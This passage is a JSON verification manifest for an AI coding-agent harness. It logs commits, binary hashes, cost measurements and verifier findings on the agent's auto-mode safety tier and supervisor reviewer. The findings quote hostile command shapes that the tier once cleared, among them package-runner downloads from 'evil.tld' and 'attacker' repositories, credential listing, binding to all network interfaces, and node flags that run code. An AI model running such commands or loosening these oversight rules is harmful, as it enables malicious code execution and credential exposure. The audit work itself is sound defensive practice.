@@ -1,0 +1,1168 @@
+{
+  "kind": "local-verification",
+  "recordedAt": "2026-09-11",
+  "fileNameNote": "Named `20260912` because it is the Phase 3 CLOSING manifest and both `verification-20260911.json` (Phase 2) and `verification-20260911b.json` (the Phase 2 re-verification) are taken. The work in it was done on 2026-09-11 local time, in two sittings: a first 3C attempt that ran the gates, found and fixed a defect, installed the build, and was then stopped by a full disk; and this pass, which audited that attempt's artifacts, finished the rig hook, took the five installed re-measurements and wrote everything down.",
+  "phase": "Claude Code handoff, Phase 3 — reduce avoidable Auto and model overhead (3A measure, 3B build, 3C verify and close)",
+  "sourceCommit": "2f13c195fc4f61d6026c55ae4fa7372105eb6893",
+  "version": "Rune v0.4.1-dev+2f13c19",
+  "supersedes": {
+    "manifest": "docs/evidence/verification-20260911b.json",
+    "note": "That manifest closed Phase 2 at 33cea48 and remains the record of what was claimed then. This one does not revisit it; it adds Phase 3."
+  },
+  "workingTree": {
+    "branch": "gear/phase-0-stabilize",
+    "statusAtStart": "`tests/helpers/scenario.ts` modified (a half-finished `RUNE_SCENARIO_CLI` hook left by the interrupted first 3C attempt), plus three untracked Phase 3A files: `docs/program/phase-3-auto-efficiency.md`, `docs/evidence/overhead-report-20260911.json`, `scripts/overhead-report.ts`.",
+    "statusAtEnd": "Those four files are committed by this pass (`tests:` then `evidence:`), together with this manifest and the doc updates. Everything else this pass wrote is under `.codex/`, which is gitignored.",
+    "note": "No push, no tag, no publish. `v0.4.1` remains the last public tag."
+  },
+  "commits": [
+    {
+      "sha": "9279bc7",
+      "lane": "Lane 0",
+      "what": "gateway: a usage row says what it was for, how long it took, and what it asked the cache (I1, I3, I5)"
+    },
+    {
+      "sha": "730fd97",
+      "lane": "Lane 0",
+      "what": "harness: a re-prompt says why it fired, a child says when it ran, and a write says whether it changed anything (I2, I4, I6)"
+    },
+    {
+      "sha": "dd37050",
+      "lane": "Lane C",
+      "what": "harness: a compaction that merges reads less than one that reads it all (C1, C2) — both halves later withdrawn by 5671ef7"
+    },
+    {
+      "sha": "4c04e03",
+      "lane": "Lane C",
+      "what": "harness: a command that ran but is not a check is told what would make it one (C3 / A1's refusal text)"
+    },
+    {
+      "sha": "bc8977f",
+      "lane": "Lane B",
+      "what": "auto: the day's work stops paying a reviewer (B1, B2, B3)"
+    },
+    {
+      "sha": "cb1b700",
+      "lane": "Fix L0",
+      "what": "gateway: an incident names the completion that paid for it, and a row nobody attributed is counted rather than lost (V-L0 #21, #3, #6)"
+    },
+    {
+      "sha": "cce7751",
+      "lane": "Fix L0",
+      "what": "harness: a child's start and integrate stamps survive the projection that persists them (V-L0 #17, #18)"
+    },
+    {
+      "sha": "2451bc1",
+      "lane": "Fix L0",
+      "what": "tests: the comparison rig's spend cap is wired, tested and compiled (V-L0 #2, #3, #4)"
+    },
+    {
+      "sha": "8691b34",
+      "lane": "Lane A",
+      "what": "harness: a late citation is not charged twice, and a write that changed nothing does not re-arm the gates (A2, A3)"
+    },
+    {
+      "sha": "80aa136",
+      "lane": "Fix B",
+      "what": "auto: the mechanical tier clears the exact shape and nothing one token wider (V-B C4, C5, C6, C7a, C7b, C8, C9, C14, C18)"
+    },
+    {
+      "sha": "6637d68",
+      "lane": "Fix B",
+      "what": "auto: the supervisor's own decisions get a corpus, and the queue wait gets a test that is not empty (V-B C3, C14)"
+    },
+    {
+      "sha": "5671ef7",
+      "lane": "Fix C",
+      "what": "harness: a merge reads its new segment whole, and a mode asked for mid-run still has its routing (V-C 1c, 1d, 1e, 2b, 2c; V-L0 #15)"
+    },
+    {
+      "sha": "1625db1",
+      "lane": "Fix A",
+      "what": "harness: an empty diff is not an unchanged tree, and a refused citation earns nothing (V-A #1/#1b, #1f, #2a; V-L0 #19)"
+    },
+    {
+      "sha": "7eb6ca8",
+      "lane": "Fix A",
+      "what": "harness: a folded tail is history, and the meter measures what went out (V-C claim 4 / §3.3)"
+    },
+    {
+      "sha": "03aaa7f",
+      "lane": "Fix A",
+      "what": "tests: the finish-path rig reads the unrecognised-check receipt (V-C 3e)"
+    },
+    {
+      "sha": "f006144",
+      "lane": "Fix A",
+      "what": "harness: name what the content-hash memory cannot see"
+    },
+    {
+      "sha": "793d0ce",
+      "lane": "3C",
+      "what": "harness: a row the harness wrote is not a turn the user took — found and fixed BY the closing pass, see `realDefectsFound[0]`"
+    },
+    {
+      "sha": "2f13c19",
+      "lane": "3C",
+      "what": "tests: the gateway rigs answer to the strict gate they are read under"
+    }
+  ],
+  "artifacts": {
+    "rune-tools-debug": {
+      "path": "/Users/ritikyadav890/Project/Alan/target/debug/rune-tools",
+      "sha256": "3c24a49e6764e66d4fbb126e1a03a4c152d4d9c6bc03f5dcd4d85fe9f35290ff",
+      "note": "Unchanged across both 3C sittings — re-hashed at the start of this pass and it still matched, so nothing was rebuilt. Exported as RUNE_TOOLS_BIN and RUNE_TOOLS_BINARY on every bun line below."
+    },
+    "installedBefore": {
+      "source": ".codex/audit-20260910/handoff/phase3/installed/install-before.txt",
+      "sha256": "be5ba2aed56c716e2aa0dbddc96d9fc9ebfbb3ce2594f2b85de0d73bd4812e67",
+      "capturedAt": "2026-09-11T14:08:53Z",
+      "version": "Rune v0.4.1-dev+33cea48",
+      "rune": { "sha256": "5a22d1513ef3a12596add9c53f2591f1f46a8938a3ef9f8cd7db0c3f6edfc2f5" },
+      "rune-compiled": {
+        "sha256": "a58f592060542f95522202ebe31fadb0b6b5d4fbcc7680a9db21e426aa347f29"
+      },
+      "rune-tools": { "sha256": "c5b44f6e3620aae0cf82941a9e155fb95097815b1cd673eb9c98aa1347a28416" }
+    },
+    "installedAfter": {
+      "source": ".codex/audit-20260910/handoff/phase3/installed/install-after.txt",
+      "sha256": "97aecd2e28e866d368811a474aa7ef6fb7b5dc2d1f3e36f30586b8fe25419954",
+      "version": "Rune v0.4.1-dev+2f13c19",
+      "rune": {
+        "sha256": "5a22d1513ef3a12596add9c53f2591f1f46a8938a3ef9f8cd7db0c3f6edfc2f5",
+        "note": "the launcher shim is byte-identical across the install, as it was across the last one"
+      },
+      "rune-compiled": {
+        "sha256": "28668d09364849cc9cf98156117e09a738871e0b0170c6d8e55c7d09b72230c1"
+      },
+      "rune-tools": {
+        "sha256": "c5b44f6e3620aae0cf82941a9e155fb95097815b1cd673eb9c98aa1347a28416",
+        "note": "UNCHANGED by this install — crates/ has not moved since 9876957 (2026-09-11 01:17), so cargo produced the same bytes."
+      },
+      "meta": {
+        "RUNE_SOURCE_COMMIT": "2f13c195fc4f61d6026c55ae4fa7372105eb6893",
+        "RUNE_SOURCE_DIRTY": "1",
+        "RUNE_BUILD_VERSION": "0.4.1-dev+2f13c19",
+        "RUNE_INSTALL_FILE_GUARD": "macos-uchg"
+      },
+      "dirtyNote": "RUNE_SOURCE_DIRTY=1 because `tests/helpers/scenario.ts` was modified in the tree at install time. The compiled CLI bundles `packages/` only; no test helper is linked into it, so the binary's contents are exactly 2f13c19.",
+      "installProof": "The installer's own `rune serve --check` staged the binary, opened a websocket session on 127.0.0.1:61938, reached `turn_complete` on session 01a090cc and shut down with zero leaked hosts before the atomic install. Log: `.codex/audit-20260910/handoff/phase3/installed/install.log` (sha256 0d056a319b7f5cde9965564f372f35776ca62c31bc2788443416269ab0256496).",
+      "reverifiedAt": "2026-09-11T14:37Z",
+      "reverification": "The installed binary was re-hashed by this pass's own driver (`.../installed/attribution/result.json`) and both hashes match after.txt. The build it reports is printed on its own header in `.../installed/attribution/resume-render.log`: `v0.4.1-dev+2f13c19`. That header is the discriminator that proves the five re-measurements below ran on the installed binary and not on the source."
+    }
+  },
+  "phase3": {
+    "measuredOverheads3A": {
+      "source": "docs/program/phase-3-auto-efficiency.md §2, reproduced by `scripts/overhead-report.ts` into `docs/evidence/overhead-report-20260911.json`. Every database is opened `readonly: true`; the script makes no network request and calls no model.",
+      "autoRuns": {
+        "runs": 93,
+        "completions": 2194,
+        "listCostUsd": 28.38,
+        "governanceShareOfCost": "27.7%",
+        "costShareByRole": {
+          "primary": "72.3%",
+          "planning": "13.0%",
+          "supervisor_review": "8.0%",
+          "compaction": "3.8%",
+          "harness_followups": "2.2%",
+          "workers": "0.7%",
+          "retries": "0.004%"
+        },
+        "perRunGovernanceShareOfCompletions": { "median": "28.1%", "p90": "60.8%", "max": "100%" },
+        "perRunCompletions": { "median": 16, "p90": 73.2, "max": 82 },
+        "shareOfRunAfterLastEdit": { "median": "13.1% (n=46)", "p90": "57.5%", "max": "85.6%" }
+      },
+      "nonAutoRuns": {
+        "runs": 128,
+        "completions": 737,
+        "listCostUsd": 4.06,
+        "governanceShareOfCost": "11.2%"
+      },
+      "promptBytes": {
+        "completionsWithACompositionRecord": 394,
+        "conversation": "54.6%",
+        "doctrine": "25.7%",
+        "toolSchemas": "19.1%",
+        "planLedger": "0.6%",
+        "taskState": "0.0%",
+        "fixedOverheadByteWeighted": "44.9%",
+        "fixedOverheadPerCompletion": { "median": "56.7%", "p90": "90.3%" },
+        "bytesPerPromptToken": 4.183
+      },
+      "cacheHitRatioByRole": {
+        "supervisor_review": 0.864,
+        "retries": 0.837,
+        "harness_followups": 0.806,
+        "primary": 0.623,
+        "planning": 0.501,
+        "compaction": 0.495,
+        "workers": 0.355,
+        "cacheCreationTokens": "0 on every row in the corpus, every role — no provider in use reports cache writes (gap I5, still open)"
+      },
+      "freshTokensPerCompletion": {
+        "compaction": 62179,
+        "planning": 36338,
+        "primary": 32745,
+        "note": "A planning completion carries MORE fresh input than a primary one and caches worse. A compaction completion is the single most expensive call in the system."
+      },
+      "pricingHonesty": {
+        "costRowsWithNoPricedField": 631,
+        "pricedRowsUsingAnInferredRate": 1341,
+        "actualMoneySpentAcrossTheWholeCorpusUsd": 0.474275,
+        "note": "Every dollar total in the 3A document is a lower bound by exactly those 631 rows: their dollar figure is unknown, not zero."
+      }
+    },
+    "pinnedBeforeAfterByLane": [
+      {
+        "id": "C1",
+        "claim": "A cheaper compaction call — summarise incrementally from the prior state rather than re-reading the window",
+        "before": 21629,
+        "afterAsBuilt": 9629,
+        "afterAsShipped": 21629,
+        "unit": "bytes of the SECOND summarizer request (15 messages, incremental)",
+        "firstCompactionBaseline": 16023,
+        "verdict": "WITHDRAWN",
+        "why": "V-C finding 1c: `transcriptMessages = toSummarize.slice(1)` is BY CONSTRUCTION the new segment — material the prior state has never seen. Clipping it to 900 characters a body destroyed the only read those messages ever get (a 901–2,400-char body lost up to 62.5% of its middle, permanently). `5671ef7` restored 2,400 characters per result for every compaction; the 900-char rendering survives only for a body an ADOPTED compaction already showed the summarizer in full, and edit-tool and patch-shaped bodies are exempt even then.",
+        "netEffect": "Lane C's net prompt saving is 0 bytes and its net correctness change is two closed holes.",
+        "remeasuredOnTheInstalledBinary": "16,023 and 21,629 — see `installedRemeasurements[4]`. The withdrawal landed exactly on V-C's arithmetic reconstruction of the pre-lane number."
+      },
+      {
+        "id": "C2",
+        "claim": "Trim the working-phase doctrine — make `# Built-in modes on request` opening-only",
+        "before": 19099,
+        "afterAsBuilt": 18358,
+        "afterAsShipped": 19099,
+        "unit": "bytes of the working-phase system prompt on Lane C's own rig",
+        "delta": -741,
+        "verdict": "REVERTED, with a JIT complement",
+        "why": "V-C finding 2b: `AgentLoop.interject()` folds mid-run steering into the SAME run and `turn` only resets per `run()`, so a mode ask lands on a `turn > 1` working-phase request with the routing gone. `5671ef7` reverted the phase gate (`keep: (c) => c.hasModeTools !== false`) and added `modes` as a just-in-time doctrine section instead: 739 B injected once per session, on runs that used to get it nowhere at all.",
+        "sectionSizeDisagreement": "The section is quoted as 739 B (Lane C's per-section table and F-C's manifest), 740 B (V-C's re-render) and the delta as 741 B by all three reports. Not reconciled; the three numbers are within rounding of one measurement of one string and nothing depends on which is right.",
+        "remeasuredOnTheInstalledBinary": "opening 22,059 B, working 19,001 B, phase-switch saving 3,058 B on the integration rig's own fixture (a different fixture from Lane C's, so the absolute numbers differ; the pinned value the test asserts, 3,058, is unmoved). See `installedRemeasurements[4]`."
+      },
+      {
+        "id": "B1",
+        "claim": "A deterministic answer beats a reviewer call",
+        "before": 6,
+        "after": 1,
+        "unit": "reviewer (`utility`-role) calls on the fixed ordinary script",
+        "verdict": "HELD, and the repair did not move it",
+        "why": "V-B found five of the six widenings reached further than the corpus shapes they were justified by (C4 package-runner escapes, C5 forge downloads, C6 credential enumeration, C7a general-purpose command runners, C8 runtime flags that execute) plus a latent W1 regression (C9, snake_case/camelCase payload keys). `80aa136` re-added every widening in its EXACT form. All five commands on the ordinary script (`npx --no playwright test`, `gh pr view`, `aws s3 ls`, `uvicorn … --host 127.0.0.1`, `node --check`) are exact forms that survived, so 6 → 1 is unchanged by the repair.",
+        "priceOfTheRepair": "A third arm now measures it: the five shapes V-B proved unsafe cost 5 screens where they cost 0 — and all five decisions are still `supervised_tier` / `allow`. Oversight came back; nothing was blocked.",
+        "remeasuredOnTheInstalledBinary": "Yes — `installedRemeasurements[2]`."
+      },
+      {
+        "id": "A3",
+        "claim": "Stand the gates down more often — a write that changed nothing does not re-arm them",
+        "before": 7,
+        "after": 6,
+        "unit": "completions on the no-op-write script (script B); the control (script C, a write that DID change a file) stays at 7 with `gate:execution-evidence`",
+        "verdict": "HELD, after a HIGH correction",
+        "why": "V-A finding #1/#1b: the excuse predicate was FALSE as stated — four excused writes did change the tree (an `apply_patch` move, a delete of an empty file, an add of an empty file, and a `multi_edit` no-op on a non-UTF-8 file whose bytes went `ff fe` → `ef bf bd ef bf bd`). `1625db1` trusts an empty diff only for `action === \"updated\"`, makes `multi_edit` decide by BYTES, and extends the answer from 2 of 4 write tools to 4 of 4. The 7 → 6 case still costs 6.",
+        "boundaryOfTheClaim": "The pre-change 7 is UNVERIFIABLE on this tree (V-A #5a): reproducing it needs `packages/` reverted. What is verified is the post-change side and the control's asymmetry.",
+        "remeasuredOnTheInstalledBinary": "Yes — `installedRemeasurements[1]`."
+      },
+      {
+        "id": "A2",
+        "claim": "Batch the citation with the check by construction",
+        "before": 0,
+        "after": 3,
+        "unit": "turns refunded on the 3-criterion script; completions are 9 BOTH WAYS",
+        "verdict": "HELD, and reported flat",
+        "why": "The completion count does not move and Lane A says so itself: the script decides when the model cites, so the three bookkeeping completions are the script's, not the harness's. §5.2 says in advance that a fixed script can only show a change in what the HARNESS spends. What A2 changes is what those completions cost — three turns of the run's budget, given back through the same `TurnRefunds` cap every gate refund uses. V-A #2 proved the refund is bounded and un-farmable: four citation-only batches after one check earn 1 refund, three identical citations in one batch earn 1, and the alternating-pair run moved the ceiling 8 → 10, exactly the cap.",
+        "correction": "V-A #2a: a citation the ledger REFUSED was still refunded and written to the audit trail as carried forward. `1625db1` moved the refund and the log line after execution, and only when every planned call succeeded.",
+        "remeasuredOnTheInstalledBinary": "Yes — `installedRemeasurements[1]`."
+      },
+      {
+        "id": "§3.3 fold",
+        "claim": "Consecutive requests share the whole stable prefix on the folding (codex) host",
+        "before": { "pair1to2": "313 / 836", "pair2to3": "562 / 1,085" },
+        "after": { "pair1to2": "835 / 836", "pair2to3": "1,586 / 1,587" },
+        "control": {
+          "openaiPair1to2": "343 / 886 (unmoved)",
+          "openaiPair2to3": "592 / 1,135 (unmoved)"
+        },
+        "unit": "shared prefix bytes per consecutive request pair, over the serialised message bodies",
+        "verdict": "FIXED",
+        "why": "V-C claim 4, graded HIGH: on codex the ephemeral tail was folded into the last tool output on the wire but the STORED message was replayed bare next turn, so the prefix diverged one message early on every request carrying a tail — before, 48% of the request was re-billed every turn. `7eb6ca8` keeps the folded tail in history (`AgentLoop.foldedTails`, a `WeakMap`) and hands `measureComposition` the wire messages with `tailInMessages`, so the composition row measures the real request.",
+        "price": "The third codex request is 1,587 bytes against 1,085 (+502, one task-state block in this fixture).",
+        "remeasuredOnTheInstalledBinary": "NO, and it cannot be — see `notProven`. Re-measured in-process at this source: `installedRemeasurements[3]`."
+      }
+    ]
+  },
+  "findings": {
+    "note": "Twelve reports: four lane reports, four adversarial verifier reports, four fix reports, all under `.codex/audit-20260910/handoff/phase3/`. The table below is every finding a verifier raised, with what closed it. The fix-report row→commit mapping is stated explicitly only in `fix-l0-report.md`; in fix-a, fix-b and fix-c it is read off the commit subjects and is marked `inferred`.",
+    "graded": [
+      {
+        "id": "V-L0 #2 / #3",
+        "severity": "HIGH",
+        "verifier": "V-L0",
+        "finding": "\"All 23 call sites moved\" was false — `tests/eval/comparison/runner.ts:240` still passed 3 args to `CostTracker.record` (TS2554). That call throws, and the throw was swallowed by `catch { return false; }`, so the OpenCode arm's budget cap was dead.",
+        "fixCommit": "2451bc1 (call site, watcher extracted, `try` narrowed to the JSON parse) + cb1b700 (runtime half: the row is kept and tagged `unattributed` rather than dropped)",
+        "migratedTest": "tests/unit/eval/comparison-budget-cap.test.ts (new, 6 cases); tests/unit/gateway/usage-attribution.test.ts restated",
+        "reverified": "`bun run typecheck` 15/15 exit 0; a repo-wide `.record(` scan over packages/, tests/, scripts/, crates/, docs/ found 110 sites with only the two deliberate `@ts-expect-error` cases short-arity. The cap fires on the step that crosses.",
+        "reverifiedInStep2": false
+      },
+      {
+        "id": "V-L0 #4",
+        "severity": "MEDIUM",
+        "verifier": "V-L0",
+        "finding": "`tests/eval` was a workspace with no `typecheck` script and no tsconfig — 36 violations across 26 files invisible to turbo's 14/14.",
+        "fixCommit": "2451bc1",
+        "migratedTest": "the 6th case of tests/unit/eval/comparison-budget-cap.test.ts",
+        "reverified": "typecheck is now 15/15 (was 14/14), covering 29 eval files plus 226 package sources.",
+        "reverifiedInStep2": true,
+        "step2Note": "This pass reran `bun run typecheck --force`: 15/15 uncached, 0 cached."
+      },
+      {
+        "id": "V-L0 #5",
+        "severity": "LOW",
+        "verifier": "V-L0",
+        "finding": "`callRole` stays optional on `AgentLoopConfig`, keeping one `?? \"primary\"` default alive (agent-loop.ts:1696).",
+        "fixCommit": "not fixed",
+        "why": "Lane A's file; F-L0 lists it as out of scope and still open.",
+        "reverifiedInStep2": false
+      },
+      {
+        "id": "V-L0 #6",
+        "severity": "LOW",
+        "verifier": "V-L0",
+        "finding": "No runtime refusal for a role-less attribution — `tracker.record(m, p, u, {})` does not throw.",
+        "fixCommit": "rejected deliberately (cb1b700)",
+        "why": "Throwing is what killed the comparison rig's cap in the first place. The row is counted and labelled `unattributed` — a value whose appearance in a ledger is itself a bug report.",
+        "migratedTest": "tests/unit/gateway/usage-attribution.test.ts",
+        "reverifiedInStep2": false
+      },
+      {
+        "id": "V-L0 #9",
+        "severity": "LOW",
+        "verifier": "V-L0",
+        "finding": "The integration test's I3 assertion (`latencyMs >= 0`) would stay green against a regression that measured nothing.",
+        "fixCommit": "not fixed",
+        "why": "F-L0 notes the new gateway test does assert against a real delay knob; the integration assertion itself is unchanged.",
+        "reverifiedInStep2": false
+      },
+      {
+        "id": "V-L0 #12",
+        "severity": "MEDIUM (claim, not code)",
+        "verifier": "V-L0",
+        "finding": "The prefix-hash docstring's inference is false: all five consecutive hashes differ, so growth and rewrite are indistinguishable in 8 hex characters.",
+        "fixCommit": "not fixed",
+        "reverifiedInStep2": false
+      },
+      {
+        "id": "V-L0 #15",
+        "severity": "MEDIUM",
+        "verifier": "V-L0",
+        "finding": "Two harness-authored `role: \"user\"` messages bypass `appendMessage` — the compaction summary and the `[Session context]` block — so neither could carry the origin `user_msg.harness` reads, and an untagged synthetic message that reaches persistence is filed as the USER'S OWN WORDS.",
+        "fixCommit": "5671ef7",
+        "migratedTest": "tests/unit/orchestrator/context-compaction-budget.test.ts; tests/integration/overhead-attribution.test.ts (\"a run that compacts files no harness-authored message as the user's own words\")",
+        "reverified": "overhead-attribution.test.ts 9 pass / 0 fail (was 8). F-C explicitly refused the naive fix — persisting the summary as a `user_msg` — because engine.ts:5171-5182 feeds persisted `user_msg` content to the permission check as trusted user input.",
+        "reverifiedInStep2": true,
+        "step2Note": "Re-run against the INSTALLED binary: 9 pass / 0 fail. This finding is also the thread that led to 793d0ce — see realDefectsFound[0]."
+      },
+      {
+        "id": "V-L0 #17 / #18",
+        "severity": "HIGH",
+        "verifier": "V-L0",
+        "finding": "I4 produced nothing on disk: `buildLifecycle`'s child whitelist dropped `startedAt`/`integratedAt`, and `\"integratedAt\"` appeared 0 times in a real scripted `task` run.",
+        "fixCommit": "cce7751",
+        "migratedTest": "tests/unit/orchestrator/harness-attribution.test.ts (projection, including absent-stays-absent) + tests/integration/child-lifecycle-stamps.test.ts (new, real rune-cli.ts read back with SQLite)",
+        "reverified": "child-lifecycle-stamps + overhead-attribution 12/0; start ≤ integrate ≤ last event, interval ≥ the child script's 250 ms sleep.",
+        "reverifiedInStep2": false
+      },
+      {
+        "id": "V-L0 #19",
+        "severity": "MEDIUM",
+        "verifier": "V-L0",
+        "finding": "`usefulEdit` was `true` for a byte-identical `write_file` — both calls `true`, `created: false`, same content hash.",
+        "fixCommit": "1625db1 (inferred), with f006144 writing down the hash memory's boundary",
+        "migratedTest": "tests/unit/orchestrator/harness-attribution.test.ts (\"a rewrite of byte-identical content is not a useful edit\")",
+        "reverified": "F-A's 8-row matrix driven through a real AgentLoop with the real tools in a temp workspace.",
+        "reverifiedInStep2": false
+      },
+      {
+        "id": "V-L0 #21",
+        "severity": "HIGH",
+        "verifier": "V-L0",
+        "finding": "The I6b incident→completion join could not resolve: incident `…48.600Z` against cost row `…48.602Z`. One attempt's `startedAt` went to `retryEvent` OR to `recordCost`, never both.",
+        "fixCommit": "cb1b700",
+        "migratedTest": "tests/unit/gateway/incident-completion-join.test.ts (new, 5 cases: 429-once, 500-twice, latency vs a 40 ms back-off, a clean call, an exhausted ladder)",
+        "reverified": "The stamp moved to CALL scope; the answering attempt is named separately as `attemptStartedAt`, present only when it differs, and `latencyMs = timestamp - (attemptStartedAt ?? startedAt)` is exact instead of approximate.",
+        "reverifiedInStep2": false
+      },
+      {
+        "id": "V-L0 #11",
+        "severity": "accepted",
+        "verifier": "V-L0",
+        "finding": "`cacheCreationTokens` is unverifiable — no provider in reach reports cache writes.",
+        "fixCommit": "accepted; the design already says so and Lane 0 does not claim otherwise",
+        "reverifiedInStep2": false
+      },
+      {
+        "id": "V-A #1 / #1b",
+        "severity": "HIGH",
+        "verifier": "V-A",
+        "finding": "A3's \"a write that changed nothing\" was false as stated: four excused writes DID change the tree — an `apply_patch` move, a delete of an empty file, an add of an empty file, and a `multi_edit` no-op on a non-UTF-8 file (`ff fe` → `ef bf bd ef bf bd`).",
+        "fixCommit": "1625db1 (inferred)",
+        "migratedTest": "tests/verification/va-a3-excuse-predicate.test.ts (5 red) → tests/unit/orchestrator/agent-loop-write-excuse.test.ts (14 cases)",
+        "reverified": "All four shapes re-arm the gates; orchestrator + gateway + tool-registry 4,026 pass / 0 fail / 1 skip.",
+        "reverifiedInStep2": true,
+        "step2Note": "The A3 pair was re-run against the installed binary: B = 6 completions with zero `gate:` origins, C = 7 with `gate:execution-evidence`."
+      },
+      {
+        "id": "V-A #1f",
+        "severity": "LOW",
+        "verifier": "V-A",
+        "finding": "A3's excuse reached only 2 of 4 write tools — `edit_file` always emits a `--- a/… +++ b/…` header and `write_file` emits no `diff` at all.",
+        "fixCommit": "1625db1 + f006144 (inferred)",
+        "migratedTest": "the 8-row matrix in tests/unit/orchestrator/agent-loop-write-excuse.test.ts",
+        "reverified": "4 of 4 write tools, both directions.",
+        "reverifiedInStep2": false
+      },
+      {
+        "id": "V-A #2a",
+        "severity": "LOW",
+        "verifier": "V-A",
+        "finding": "A citation the ledger REFUSED was still refunded and written to the audit trail as \"carried forward\".",
+        "fixCommit": "1625db1 (inferred)",
+        "migratedTest": "tests/verification/va-a2-citation-refund.test.ts (1 red) → a case in tests/unit/orchestrator/agent-loop-citation-carry-forward.test.ts",
+        "reverified": "9/9 in that file; the cap, the once-per-turn rule and the check-list rotation are untouched.",
+        "reverifiedInStep2": false
+      },
+      {
+        "id": "V-A #3a",
+        "severity": "LOW",
+        "verifier": "V-A",
+        "finding": "Single-point coverage: only `agent-loop-spine-writes.test.ts:174` goes red if the report-step rule is reverted.",
+        "fixCommit": "not fixed",
+        "reverifiedInStep2": false
+      },
+      {
+        "id": "V-A #4",
+        "severity": "LOW (disclosed, strictly stricter)",
+        "verifier": "V-A",
+        "finding": "The four protected suites §6.2 names are byte-identical, but a fifth (`agent-loop-spine-writes.test.ts`) is +32/−13.",
+        "fixCommit": "accepted — disclosed by Lane A itself and in the stricter direction",
+        "reverifiedInStep2": false
+      },
+      {
+        "id": "V-A §2 (in passing)",
+        "severity": "claim correction",
+        "verifier": "V-A",
+        "finding": "Lane A's report says A3 stands down \"all five\" gates; `planSettled` is read by exactly two — agent-loop.ts:2552 (execution-evidence) and :2607 (fix-verified).",
+        "fixCommit": "not a code change; F-A's matrix reports the two gates",
+        "reverifiedInStep2": false
+      },
+      {
+        "id": "V-B C3",
+        "severity": "MEDIUM (evidence)",
+        "verifier": "V-B",
+        "finding": "Over-claim: the auto-safety floor validates W1 alone — the 227 corpus rows contain ZERO `supervisor_skipped`/`supervisor_halt`, so W2–W6 cannot move a single eval decision.",
+        "fixCommit": "6637d68",
+        "migratedTest": "93 `SUPERVISOR_SHAPES` rows in the auto-mode corpus, scored APART from the 227",
+        "reverified": "Supervisor shapes P 100.0% [94–100] R 100.0% [94–100] F1 100.0%; 56/56 dangerous watched, 37/37 ordinary cleared. Non-vacuous: 38 wrong at bc8977f, 19 wrong at 730fd97, 0 wrong at HEAD.",
+        "reverifiedInStep2": true,
+        "step2Note": "This pass reran `bun run eval:auto-safety --offline`: Overall P 92.8 / R 89.1 / F1 90.9 against the §7 floor of P 90.0 / R 89.1 / F1 89.6, and the supervisor-shapes block at 100/100/100. 0 live requests."
+      },
+      {
+        "id": "V-B C4",
+        "severity": "HIGH",
+        "verifier": "V-B",
+        "finding": "W2 cleared eight package-runner escapes, among them `npx tsc-evil-backdoor`, `npx tap@https://evil.tld/…`, `npx next@github:attacker/pwn` and `npx --package evil-package tsc`.",
+        "fixCommit": "80aa136 (inferred)",
+        "migratedTest": "tests/verification/vb-lane-b-shell-tier.test.ts → tests/unit/orchestrator/auto-mode-shell-tier-exact-shapes.test.ts (8 cases) + shell-safety.test.ts (9 shapes)",
+        "reverified": "V-B's two files 41 pass / 0 fail, against 1 pass / 40 fail at 8691b34, with not one assertion changed — only the file header and four `describe` strings.",
+        "reverifiedInStep2": true,
+        "step2Note": "Inside this pass's unit rerun (4,734/0/1) and its offline auto-safety rerun."
+      },
+      {
+        "id": "V-B C5",
+        "severity": "LOW–MEDIUM",
+        "verifier": "V-B",
+        "finding": "`gh run download` and `gh release download` write remote bytes into the workspace and cleared mechanically.",
+        "fixCommit": "80aa136 (inferred) — `download` removed from the forge verb list, verb terminated `(?![\\w-])`",
+        "migratedTest": "auto-mode-shell-tier-exact-shapes.test.ts",
+        "reverifiedInStep2": true
+      },
+      {
+        "id": "V-B C6",
+        "severity": "LOW–MEDIUM",
+        "verifier": "V-B",
+        "finding": "`aws iam list-access-keys` cleared — a `list-` verb over credential material.",
+        "fixCommit": "80aa136 (inferred) — a new `CLOUD_IDENTITY_SUBJECT_RE`",
+        "migratedTest": "auto-mode-shell-tier-exact-shapes.test.ts + shell-safety.test.ts",
+        "reverifiedInStep2": true
+      },
+      {
+        "id": "V-B C7a",
+        "severity": "HIGH",
+        "verifier": "V-B",
+        "finding": "W5 was false: 12 of the 20 \"local dev server\" programs are general-purpose command runners (`entr`, `watchexec`, `just`, `mise`, `direnv`, `pm2`, `foreman`, `overmind`, `honcho`, `concurrently`, `air`, `celery`).",
+        "fixCommit": "80aa136 (inferred) — the list cut to nine real servers; `nodemon` dropped too, for `--exec`",
+        "migratedTest": "auto-mode-shell-tier-exact-shapes.test.ts (12 cases)",
+        "reverifiedInStep2": true
+      },
+      {
+        "id": "V-B C7b",
+        "severity": "HIGH",
+        "verifier": "V-B",
+        "finding": "`BEYOND_LOOPBACK_RE` missed `-a`, `-H` and `--hostname`, so `http-server -a 0.0.0.0 /` bound every interface unstopped — and was CLEARED at both commits, so the hole is older than the lane.",
+        "fixCommit": "80aa136 (inferred)",
+        "migratedTest": ".codex/audit-20260910/handoff/phase3/fix-b/probe-extra-after.txt",
+        "reverifiedInStep2": true,
+        "step2Note": "This pass read the shipped regex (auto-containment.ts:256-257) and corrected `docs/threat-model.md`, whose wildcard-bind list still named only `--host`, `--bind` and `0.0.0.0:<port>`."
+      },
+      {
+        "id": "V-B C8",
+        "severity": "HIGH",
+        "verifier": "V-B",
+        "finding": "W6 was false: the general leading-flag form admitted `--require`, `-r` and `--experimental-permission --allow-fs-write=/`.",
+        "fixCommit": "80aa136 (inferred) — reverted to 730fd97's form plus one exact line, `^node\\s+--check\\s+\\S+\\.(?:m?[jt]sx?|cjs)\\s*$`",
+        "migratedTest": "auto-mode-shell-tier-exact-shapes.test.ts (4 cases) + shell-safety.test.ts",
+        "reverifiedInStep2": true
+      },
+      {
+        "id": "V-B C9",
+        "severity": "MEDIUM",
+        "verifier": "V-B",
+        "finding": "A latent W1 regression: `\\b` does not fire before `_`, so every snake_case or camelCase payload key (`request_body`, `post_data`, `requestBody`, `fileContents`) dropped from high to medium.",
+        "fixCommit": "80aa136 (inferred) — boundaries on LETTERS, camelCase humps split first, in a new `carriesOutboundPayload()`",
+        "migratedTest": "vb-lane-b-payload-regex.test.ts → tests/unit/orchestrator/auto-mode-payload-key-boundaries.test.ts (13 keys + 2 controls)",
+        "reverifiedInStep2": true
+      },
+      {
+        "id": "V-B C10",
+        "severity": "LOW",
+        "verifier": "V-B",
+        "finding": "A plural gap in `SECRET_SUBJECT_RE` (`\\btoken\\b` misses \"tokens\") — theoretical, no cloud command reaches it.",
